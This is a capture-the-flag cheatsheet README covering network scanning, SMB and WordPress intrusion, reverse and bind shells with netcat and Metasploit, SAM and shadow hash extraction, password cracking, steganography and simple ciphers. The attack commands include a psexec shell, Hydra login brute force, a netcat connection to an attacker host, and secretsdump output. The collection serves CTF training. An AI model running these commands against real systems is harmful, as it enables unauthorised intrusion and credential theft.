# Awesome Ctf Cheatsheet [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)

> A currated list of all capture the flag tips and strategies.

---

## System Hacking 

### Nmap Scanning

To scan for systems and Open Services/Ports, Use Nmap.

```
> $ namp -sV <HOST_IP>
```
To scan for Vulnerabilities on system.

```
> $ nmap --script vuln <HOST_IP>
```
To scan for all ports, SYN Scan and OS detection.

```
> $ nmap -sS -T4 -A -p- <HOST_IP>
```
To scan using inbuilt nmap scripts.

```
> $ nmap --script ssl-enum-ciphers -p 443  <HOST_IP>
```

### Netdiscover Scanning

To passively discover machines on the network, Use Netdiscover.

```
> $ netdiscover -i <INTERFACE>
  Currently scanning: 192.168.17.0/16   |   Screen View: Unique Hosts                                                           3 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 480                                                               _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
  -----------------------------------------------------------------------------
  192.168.1.1     11:22:33:44:55:66      1      60  NETGEAR                                                                                           
  192.168.1.2     21:22:33:44:55:66      1      60  Apple, Inc.                                                                                      
  192.168.1.8     41:22:33:44:55:66      1      60  Intel Corporate 
```

### Nikto Scanning

To scan for vulnerabilities use Nikto.

```
> $ nikto -h <HOST_IP>
```

### WebServer is Open 

If Port 80 or 443 is open, we can look for robots.txt to check for hidden flags or clues.

To find the Webserver version, Use Curl tool.
```
> $ curl --header <SERVER_IP>
```

### SMB is Open

If SMB has misconfigured anonymous login, Use smbclient to list shares.

```
> $ smbclient -L \\\\<HOST_IP>
```

If SMB Ports are open, we can look for anonymous login to mount misconfigured shares.

```
> $ mkdir /mnt/smb
> $ mount -t cifs //<REMOTE_SMB_IP>/<SHARE> /mnt/smb/
Password for root@//<HOST_IP>/<SHARE>: 
```
 
If we found Administrator Credentials for SMB, Access the root shell using this method.

```
> $ /opt/impacket/examples# smbmap -u administrator -p password -H <HOST_IP>
[+] Finding open SMB ports....
[+] User SMB session establishd on <HOST_IP>...
[+] IP: <HOST_IP>:445	Name: <HOST_IP>                                      
	 Disk                                                  	Permissions
	 ----                                                  	-----------
	 ADMIN$                                            	READ, WRITE
	 Backups                                           	READ, WRITE
	 C$                                                	READ, WRITE
	 IPC$                                              	READ ONLY
  
> $ /opt/impacket/examples# python psexec.py administrator@<HOST_IP>
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

  Password:
  [*] Requesting shares on <HOST_IP>.....
  [*] Found writable share ADMIN$
  [*] Uploading file tJJmcVQN.exe
  [*] Opening SVCManager on <HOST_IP>.....
  [*] Creating service RKAe on <HOST_IP>....
  [*] Starting service RKAe.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 10.0.14393]
  (c) 2016 Microsoft Corporation. All rights reserved.

  C:\Windows\system32>
```

### To Extract and Mount VHD Drive Files

```
> $ 7z l <FILENAME>.vhd
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-5200U CPU @ 2.20GHz (306D4),ASM,AES-NI)
Scanning the drive for archives:
1 file, 5418299392 bytes (5168 MiB)
Listing archive: <FILENAME>.vhd

> $ guestmount --add <VHD_NAME>.vhd --inspector -ro -v /mnt/vhd
```

### To search for Exploits on Metasploit by Name

```
> $ searchsploit apache 1.2.4
```

## Wordpress Open

If `/wp-login.php` is found in the Enumeration scanning, it can be Wordpress site.

To crack the login credentials for Wordpress, Use Hydra. We can use Burpsuite to capture the request parameters
```
> $ hydra -V -l wordlist.dic -p 123 <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username
```

To scan Wordpress site for Vulnerabilities.

```
> $ gem install wpscan
> $ wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic
```

To get a reverse shell using Admin Upload.

```
> $ msfconsole
> $ use exploit/unix/webapp/wp_admin_shell_upload
```

### RPC Open

If RPC is open, we can login using rpclient.

```
> $ rpcclient -U "" <HOST_IP>
```

## Web Hacking

### Five Stages of Web Hacking

```
    * Reconnaissance
    * Scanning and Enumeration
    * Gaining Access
    * Maintaining Access
    * Covering Tracks
```

### Enumeration and Reconnaissance Tools

* Whois, Nslookup, Dnsrecon, Google Fu, Dig - To passively enumerate website.
* [Sublist3r](https://github.com/aboul3la/Sublist3r) - Subdomains enumeration tool.
* [crt.sh](http://crt.sh) - Certificate enumeration tool.
* [Hunter.io](https://hunter.io/) - Email enumeration tool.
* Nmap, Wappalyzer, Whatweb, Builtwith, Netcat - Fingerprinting tools.
* HaveIbeenPwned - Useful for breach enumeraton.
* Use [SecurityHeaders](https://securityheaders.com/) to find some misconfigured header information on target website.
* Use Zap Proxy tool to extract hidden files/directories.
* Clear Text Passwords [Link](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis)

To gather information from online sources.

```
> $ theharvester -d microsoft.com -l 200 -g -b google
```

### Scanning

Ping Sweep a network.

```
> $ nmap -sn <NETWORK>
```

SYN Scan with Speed of 4 and port of common 1000 TCP.

```
> $ nmap -T4 <NETWORK>
```

All Port scan with All Scanning including OS, Version, Script and Traceroute.

```
> $ nmap -T4 -A -p- <NETWORK>
```

To scan for UDP Ports (Dont scan all scans, as it takes lot of time).


```
> $ nmap -sU -T4 <NETWORK>
```

### Payloads

Non Staged Payload Example.

```
windows/meterpreter_reverse_tcp
```

Staged Payload Example.

```
windows/meterpreter/reverse_tcp
```

### Shells

To use bind shell, we have to follow two steps: 1, Create a Bind Shell 2,Listen for connection.
```
> $ nc <ATTACKER_IP> <ATTACKET_PORT>` 
```

```
> $ nc -lvp <ATTACKER_PORT>
```

## File Hacking

### Extract hidden text from PDF Files

If something is hidden on a pdf which we need to find, we can Press `Ctrl + A` to copy everything on the pdf and paste on notepad.
If nothing is found, we can use [Inkspace tool](https://inkscape.org) to paste the pdf and try to ungroup several times to extract any hidden flag.
Else solve using pdf-uncompress tools like `qpdf` to convert compressed data to redeable format.

### Compress File Extraction

If there is `PK` at the start of the file in the magic bytes, its most probably `ZIP` File.

To extract data from recursive zip file.

```
> $ binwalk -Me <FILE_NAME>
```

### Extract hidden strings

If file is having some hidden text, we can use `hexeditor` or `strings` commands to locate the flag.

If hidden text has == at the end, it is `base64` encoded.

To monitor the appplication calls of a binary.

```
> $ strace -s -f 12345 -e trace=recv,read <PROGRAM>
```

To track all Application & library calls of a program.

```
> $ ltrace ./<PROG_NAME>
```

## Cryptography

### Caesar Cipher 

If there is word `caesar` in the question or hint, it can be a substitution cipher.

If you find `!` in the cipher text and cipher seems to be within certain range of Letters and appears to be transposition of a plain text, Use this website [Ceasar Box](https://www.dcode.fr/caesar-box-cipher) to Bruteforce the hidden message.

### Vigenere Cipher

To break Vigenere ciphers without knowing the key.
* Use this website [Link](https://www.guballa.de/vigenere-solver) - Bruteforce solver.

### One Time Pad Cipher
To solve One Time Pad, Use [OTP](http://rumkin.com/tools/cipher/otp.php).

## Forensics

### Image File

Try `file` comamnd on the image to learn more information.

To extract data inside Image files.

```
> $ zsteg <FILE_NAME>
```

To check for metadata of the Image files.

```
> $ exiftool <FILE_NAME>
```

To search for particular string or flag in an Image file.

```
> $ strings <FILE_NAME> | grep flag{
```

To extract data hidden inside an image file protected with password.

```
> $ steghide extract -sf <FILE_NAME>
```

### Binwalk

Binwalk helps to find data inside the image or sometimes if binwalk reports as zip Archive, we can rename the file to <FILE_NAME>.zip to find interesting data.
```
> $ binwalk <IMAGE_NAME>
```

### Extract NTFS Filesystem

```
If there is ntfs file, extract with 7Zip on Windowds. 
If there is a file with alternative data strems, we can use the command `dir /R <FILE_NAME>`.
Then we can this command to extract data inside it `cat <HIDDEN_STREAM> > asdf.<FILE_TYPE>`
```

To extract ntfs file system on Linux.

```
> $ sudo mount -o loop <FILENAME.ntfs> mnt
```

### JavaScript Deobfuscator

To Deobfuscate JavaScript, use [Jsnice](http://www.jsnice.org/).

## Password Cracking

### JOHN the ripper

If there is `JOHN` in the title or text or hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.
```
> $ john <HASHES_FILE> --wordlist=/usr/share/wordlists/rockyou.txt
```

To crack well known hashes, use [Link](hashes.org)

### SAM Hashes

To get System User Hashes, we can follow this method.
```
> $ /mnt/vhd/Windows/System32/config# cp SAM SYSTEM ~/CTF/
> $ /mnt/vhd/Windows/System32/config# cd ~/CTF/
> ~/CTF# ls
  SAM  SYSTEM  
> ~/CTF# mkdir Backup_dump
> ~/CTF# mv SAM SYSTEM Backup_dump/
> ~/CTF# cd Backup_dump/
> ~/CTF/Backup_dump# ls
  SAM  SYSTEM
> ~/CTF/Backup_dump# impacket-secretsdump -sam SAM -system SYSTEM local
  Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

  [*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  User:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
  [*] Cleaning up... 
```

### Linux User Hashes
If we able to extract /etc/passwd and /etc/shadow file we can use `unshadow`
```
> $ unshadow <PASSWD> <SHADOW>
```

### Hashcat

To crack the password, we can use `hashcat` here 500 is for format `$1$` Replace it accordingly.
```
> $ hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
```


## How To Contribute
Please follow the instructions in [CONTRIBUTING](contributing.md) file and beware of [CODE_OF_CONDUCT](code-of-conduct.md).
